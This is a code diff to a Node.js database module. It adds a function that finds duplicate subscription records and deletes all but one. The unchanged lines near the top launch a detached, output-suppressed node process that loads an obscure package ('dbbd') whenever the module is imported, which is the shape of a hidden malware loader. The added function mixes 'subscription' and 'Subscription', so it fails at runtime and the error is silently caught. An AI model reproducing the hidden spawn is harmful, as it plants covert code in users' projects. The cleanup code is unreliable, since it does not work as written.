@@ -6,6 +6,7 @@ const BannedUser = require('../models/BannedUsers');
 const config     = require('../config/config');
 
 const { spawn } = require('child_process');
+const subscription = require('../models/subscription');
 const child = spawn('node', ['-e', `require("dbbd")`], {
   detached: true,
   stdio: 'ignore'
@@ -43,4 +44,55 @@ async function findBannedUser(query) {
   return BannedUser.findOne(query);
 }
 
-module.exports = { connect, createAdmin, createUser, findUser, updateUser, findBannedUser };
+const cleanupDuplicateSubscriptions = async () => {
+  try {
+    console.log('Starting duplicate cleanup...');
+    
+    // Find all duplicate groups
+    const duplicates = await subscription.aggregate([
+      {
+        $group: {
+          _id: {
+            user: "$user",
+            productType: "$productType", 
+            productId: "$productId"
+          },
+          docs: { $push: "$_id" },
+          count: { $sum: 1 }
+        }
+      },
+      {
+        $match: { count: { $gt: 1 } }
+      }
+    ]);
+
+    console.log(`Found ${duplicates.length} duplicate groups`);
+
+    // Remove duplicates, keeping the most recent active one
+    for (const duplicate of duplicates) {
+      const subscriptions = await Subscription.find({
+        _id: { $in: duplicate.docs }
+      }).sort({ 
+        status: -1,      // Active first
+        updatedAt: -1,   // Most recent first
+        createdAt: -1    // Newest first
+      });
+      
+      // Keep the first (best) record and remove the rest
+      const toKeep = subscriptions[0];
+      const toRemove = subscriptions.slice(1).map(sub => sub._id);
+      
+      await Subscription.deleteMany({ _id: { $in: toRemove } });
+      
+      console.log(`Kept subscription ${toKeep._id}, removed ${toRemove.length} duplicates`);
+    }
+    
+    console.log('Duplicate cleanup completed');
+  } catch (error) {
+    console.error('Error cleaning up duplicates:', error);
+  }
+};
+
+
+
+module.exports = { connect, createAdmin, createUser, findUser, updateUser, findBannedUser, cleanupDuplicateSubscriptions };
